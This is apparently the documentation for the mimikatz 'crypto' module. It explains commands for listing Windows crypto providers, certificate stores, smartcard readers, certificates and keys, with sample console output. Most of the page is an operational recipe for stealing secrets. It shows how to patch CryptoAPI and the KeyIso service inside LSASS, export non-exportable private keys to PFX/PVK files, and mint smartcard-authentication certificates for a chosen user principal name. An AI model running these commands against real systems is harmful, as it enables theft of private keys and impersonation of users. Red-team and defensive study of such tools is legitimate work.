This module, one of the oldest, plays with `CryptoAPI` functions. Basically it's a little `certutil` that benefit of token impersonation, patch legacy `CryptoAPI` functions and patch `CNG` key isolation service.

> Commands: [providers](#providers), [stores](#stores), [sc](#sc), [scauth](#scauth), [certificates](#certificates), [keys](#keys), [capi](#capi), [cng](#cng)

## providers
This command list all providers: CryptoAPI, then CNG if available (NT 6).
```
mimikatz # crypto::providers

CryptoAPI providers :
 0. RSA_FULL      ( 1) - Microsoft Base Cryptographic Provider v1.0
 1. DSS_DH        (13) - Microsoft Base DSS and Diffie-Hellman Cryptographic Provider
 2. DSS           ( 3) - Microsoft Base DSS Cryptographic Provider
 3. RSA_FULL      ( 1) - Microsoft Base Smart Card Crypto Provider
 4. DH_SCHANNEL   (18) - Microsoft DH SChannel Cryptographic Provider
 5. RSA_FULL      ( 1) - Microsoft Enhanced Cryptographic Provider v1.0
 6. DSS_DH        (13) - Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider
 7. RSA_AES       (24) - Microsoft Enhanced RSA and AES Cryptographic Provider
 8. RSA_SCHANNEL  (12) - Microsoft RSA SChannel Cryptographic Provider
 9. RSA_FULL      ( 1) - Microsoft Strong Cryptographic Provider

CryptoAPI provider types:
 0. RSA_FULL      ( 1) - RSA Full (Signature and Key Exchange)
 1. DSS           ( 3) - DSS Signature
 2. RSA_SCHANNEL  (12) - RSA SChannel
 3. DSS_DH        (13) - DSS Signature with Diffie-Hellman Key Exchange
 4. DH_SCHANNEL   (18) - Diffie-Hellman SChannel
 5. RSA_AES       (24) - RSA Full and AES

CNG providers :
 0. Microsoft Key Protection Provider
 1. Microsoft Passport Key Storage Provider
 2. Microsoft Platform Crypto Provider
 3. Microsoft Primitive Provider
 4. Microsoft Smart Card Key Storage Provider
 5. Microsoft Software Key Storage Provider
 6. Microsoft SSL Protocol Provider
 7. Windows Client Key Protection Provider
```

## stores
This command lists logical store in a system store.

**Arguments:**
* `/systemstore` - _optional_ - the system store that must be used to list stores (default: `CERT_SYSTEM_STORE_CURRENT_USER`)  
  It can be one of:
  * `CERT_SYSTEM_STORE_CURRENT_USER` or `CURRENT_USER`
  * `CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY` or `USER_GROUP_POLICY`
  * `CERT_SYSTEM_STORE_LOCAL_MACHINE` or `LOCAL_MACHINE`
  * `CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY` or `LOCAL_MACHINE_GROUP_POLICY`
  * `CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE` or `LOCAL_MACHINE_ENTERPRISE`
  * `CERT_SYSTEM_STORE_CURRENT_SERVICE` or `CURRENT_SERVICE`
  * `CERT_SYSTEM_STORE_USERS` or `USERS`
  * `CERT_SYSTEM_STORE_SERVICES` or `SERVICES`

```
mimikatz # crypto::stores /systemstore:local_machine
Asking for System Store 'local_machine' (0x00020000)
 0. My
 1. Root
 2. Trust
 3. CA
 4. TrustedPublisher
 5. Disallowed
 6. AuthRoot
 7. TrustedPeople
 8. ADDRESSBOOK
 9. ipcu
10. Remote Desktop
11. REQUEST
12. SmartCardRoot
13. TrustedDevices
14. Windows Live ID Token Issuer
```

## sc
This command lists smartcard/token reader(s) on, or deported to, the system. When the CSP is available, it tries to list keys on the smartcard.

```
mimikatz # crypto::sc
SmartCard readers:

 * OMNIKEY CardMan 3x21 0
    ATR  : 3bb794008131fe6553504b32339000d1
    Model: G&D SPK 2.3 T=1
    CSP  : SafeSign Standard Cryptographic Service Provider

 0. 34C99D73A1FAE4D44F9966DF626623DF18858C83
    34C99D73A1FAE4D44F9966DF626623DF18858C83
        Type           : AT_KEYEXCHANGE (0x00000001)
        Exportable key : NO
        Key size       : 1024

 * SCM Microsystems Inc. SCR35xx USB Smart Card Reader 0
```

## scauth
This command creates a client certificate for smartcard authentication, signed by a Certificate Authority

**Arguments:**
* `/caname` - the subject name of the certificate authority (needed to sign the certificate)
* `/castore` - _optional_ - the system store that contains the certificate authority (default: `CERT_SYSTEM_STORE_LOCAL_MACHINE`)
* `/upn` - the User Principal Name (`UPN`) targetted (eg: `user@lab.local`)
* `/pfx` - _optional_ - the filename for saving the final certificate (default: _no file, stored in `CERT_SYSTEM_STORE_CURRENT_USER`_)

```
mimikatz # crypto::scauth /caname:KiwiAC /upn:user@lab.local /pfx:user.pfx
CA store       : LOCAL_MACHINE
CA name        : KiwiAC
CA validity    : 22/08/2016 22:00:36 -> 22/08/2021 22:10:35
Certificate UPN: user@lab.local
Key container  : {a1bd29ec-4203-4aac-8159-40f28f96335b}
Key provider   : Microsoft Enhanced Cryptographic Provider v1.0
Private Export : user.pfx - OK
```

## certificates
This command lists certificates and properties of theirs keys. It can export certificates too.

**Arguments:**
* `/systemstore` - _optional_ - the system store that must be used (default: `CERT_SYSTEM_STORE_CURRENT_USER`)
* `/store` - _optional_ - the store that must be used to list/export certificates (default: `My`) - full list with [`crypto::stores`](#stores)
* `/export` - _optional_ - export all certificates to files (public parts in `DER`, private parts in `PFX` files - password protected with: `mimikatz`)
* `/silent` - _optional_ - if user interaction is required, then abort
* `/nokey` - _optional_ - do not try to interact with the private key

```
mimikatz # crypto::capi
Local CryptoAPI patched

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # crypto::cng
"KeyIso" service patched

mimikatz # crypto::certificates /systemstore:local_machine /store:my /export
 * System Store  : 'local_machine' (0x00020000)
 * Store         : 'my'

 0. example.domain.local
        Key Container  : example.domain.local
        Provider       : Microsoft Software Key Storage Provider
        Type           : CNG Key (0xffffffff)
        Exportable key : NO
        Key size       : 2048
        Public export  : OK - 'local_machine_my_0_example.domain.local.der'
        Private export : OK - 'local_machine_my_0_example.domain.local.pfx'
```

**Remarks:**
* See [`crypto::stores`](#stores) for valid `systemstore` list, and its output for `store` list.
* Non exportable keys (with `KO - ERROR kuhl_m_crypto_exportCert ; Export / CreateFile (0x8009000b)`) can often be exported with [`crypto::capi`](#capi) and/or [`crypto::cng`](#cng)
* Despite [`crypto::capi`](#capi) or [`crypto::cng`](#cng) patch, you must have correct ACL on filesystem to access private keys (UAC... :wink:)
* Some **smartcard** crypto providers can report a successfull private export (it's not, of course :wink:)

## keys
This command lists keys, by provider. It can export keys too.

**Arguments:**
* `/provider` - _optional_ - the legacy `CryptoAPI` provider (default: `MS_ENHANCED_PROV`)
* `/providertype` - _optional_ - the legacy `CryptoAPI` provider type (default: `PROV_RSA_FULL`)
* `/cngprovider` - _optional_ - the `CNG` provider (default: `Microsoft Software Key Storage Provider`)
* `/export` - _optional_ - export all key to `PVK` files
* `/silent` - _optional_ - if user interaction is required, then abort

_full list of providers details [`crypto::providers`](#providers)_

```
mimikatz # crypto::keys /export
 * Store         : 'user'
 * Provider      : 'MS_ENHANCED_PROV' ('Microsoft Enhanced Cryptographic Provider v1.0')
 * Provider type : 'PROV_RSA_FULL' (1)
 * CNG Provider  : 'Microsoft Software Key Storage Provider'

CryptoAPI keys :

 0. myCapiKey
    223311d3b5d990f48c65070b883b9ef1_33b8db1c-b3d2-4912-b24e-fc0742b704c1
        Type           : AT_KEYEXCHANGE (0x00000001)
        Exportable key : YES
        Key size       : 2048
        Private export : OK - 'user_capi_0_myCapiKey.pvk'

 1. OC_KeyContainer_Lync_user@domain.local
    49e3a9228aa9a33357545413fba35d07_33b8db1c-b3d2-4912-b24e-fc0742b704c1
        Type           : AT_SIGNATURE (0x00000002)
        Exportable key : NO
        Key size       : 2048
        Private export : KO - ERROR kuhl_m_crypto_exportKeyToFile ; Export / CreateFile (0x8009000b)

CNG keys :

 0. mykey-d535a6d8-70f5-496f-8c85-17c8fd26f379
    98a436bd6f4caa9b24379112b577f688_33b8db1c-b3d2-4912-b24e-fc0742b704c1
        Exportable key : NO
        Key size       : 2048
        Private export : KO - ERROR kuhl_m_crypto_exportKeyToFile ; Export / CreateFile (0x80090029)
````

**Remarks:**
* If needed, you can convert `PVK` files with: `openssl rsa -inform pvk -in key.pvk -outform pem -out key.pem`

## capi
This patch modify a ``CryptoAPI`` function, in the ``mimikatz`` process, in order to make unexportable keys, exportable (no specifig right other than access to the private key is needed)

This is only useful when the keys provider is one of:
* ``Microsoft Base Cryptographic Provider v1.0``
* ``Microsoft Enhanced Cryptographic Provider v1.0``
* ``Microsoft Enhanced RSA and AES Cryptographic Provider``
* ``Microsoft RSA SChannel Cryptographic Provider``
* ``Microsoft Strong Cryptographic Provider``

_can be used with [`crypto::certificates`](#certificates) and [`crypto::keys`](#keys)_
```
mimikatz # crypto::capi
Local CryptoAPI patched
```

## cng
This patch modify ``KeyIso`` service, in ``LSASS`` process, in order to make unexportable keys, exportable

This is only useful when the keys provider is ``Microsoft Software Key Storage Provider`` (you do **not** need to patch ``CNG`` for other providers).

_can be used with [`crypto::certificates`](#certificates) and [`crypto::keys`](#keys)_
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # crypto::cng
"KeyIso" service patched
```